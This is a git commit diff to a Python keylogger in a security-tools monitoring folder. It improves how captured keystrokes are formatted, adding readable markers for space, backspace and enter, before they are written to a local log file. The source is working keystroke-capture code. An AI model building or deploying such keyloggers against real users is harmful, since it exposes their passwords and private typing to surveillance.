710b5cc3e548ff4e2f1b1c0d02fe5a649b4a9e95
Daren <darenalyze@gmail.com>
2026-06-08 00:33:58 +0800

    feat: Enhance key logging with optional whitespace
    Modified the key logging functionality to optionally include whitespace in the log file. Updated the 'save_in_key_log_file' function to accept a 'with_whitespace' parameter.

--- security-tools/monitoring/keylogger/main.py
+++ security-tools/monitoring/keylogger/main.py
@@ -3,36 +3,44 @@ import os
 
 keyboard = pynput.keyboard
 script_dir = os.path.dirname(os.path.abspath(__file__))
-
 key_buffer = []
 
 # Configuration
 key_logs_file_path = os.path.join(script_dir, "keylog.txt")
 
-
 def combined_keys_in_list(list: list):
     return "".join(list)
-
-def save_in_key_log_file(combined_letter_in_list):
+    
+def save_in_key_log_file(combined_letter_in_list, with_whitespace=False):
     with open(key_logs_file_path, "a") as file:
         file.write(combined_letter_in_list)
-
+        if with_whitespace:
+            file.write("\n")   
+            
 def on_press(key):
     pass
-
+    
 def on_release(key):
-    key_str = str(key) 
-    
-    key_buffer.append(key_str)
-    
     buttkey = keyboard.Key
-    if key in (buttkey.space, buttkey.enter, buttkey.esc, buttkey.cmd):
+    with_whitespace = True
+    if hasattr(key, 'char') and key.char:
+        key_str = key.char
+    else:
+        key_str = str(key)
+    if key in (buttkey.backspace, buttkey.space, buttkey.enter, buttkey.esc, buttkey.cmd):
+        if key == buttkey.space:
+            key_str = " "
+            with_whitespace = False
+        elif key == buttkey.backspace:
+            key_str = " /(backspace)"
+        elif key == buttkey.enter:
+            key_str = " /(enter)"
+        key_buffer.append(key_str)
         result = combined_keys_in_list(key_buffer)
-        save_in_key_log_file(result)
+        save_in_key_log_file(result, with_whitespace)
         key_buffer.clear()
-
-
-    
+    else:
+        key_buffer.append(key_str)
 
 listener = keyboard.Listener(
     on_press=on_press,
